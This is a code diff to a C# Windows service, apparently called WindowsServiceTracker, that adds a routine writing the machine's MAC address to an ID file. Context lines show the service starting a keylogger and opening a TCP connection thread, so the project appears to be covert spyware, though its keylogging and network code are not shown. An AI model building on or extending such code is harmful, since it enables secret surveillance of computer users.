@@ -44,6 +44,7 @@ namespace WindowsServiceTracker
         private const string REG_FIELD_MAC = "MAC";
         private const string REG_VAL_FALSE = "false";
         private const string REG_VAL_TRUE = "true";
+        private const string ID_FILE = "ID.txt";
 
         //Variables
         private volatile String ipAddressString = "127.0.0.1";
@@ -140,6 +141,7 @@ namespace WindowsServiceTracker
                 StartKeylogger();
             }
             macAddress = getMacAddress();
+            createIDFile();
             //StartKeylogger(); //todo remove after debugging
 
             tcpThread = new Thread(this.IpConnectionThread);
@@ -770,6 +772,30 @@ namespace WindowsServiceTracker
             }
 
             return mac;
+        }
+
+        /* Creates a file with the ID (MAC adress) that the service is using
+         * to identify itself
+         */ 
+        private void createIDFile()
+        {
+            string tempID = "tempID";
+            try
+            {
+                StreamWriter idOut = new StreamWriter(tempID);
+                idOut.Write(macAddress);
+                idOut.Close();
+                File.Move(tempID, ID_FILE);
+            }
+            catch
+            {
+                try
+                {
+                    File.Delete(tempID);
+                }
+                catch
+                { }
+            }
         }
     }
 }
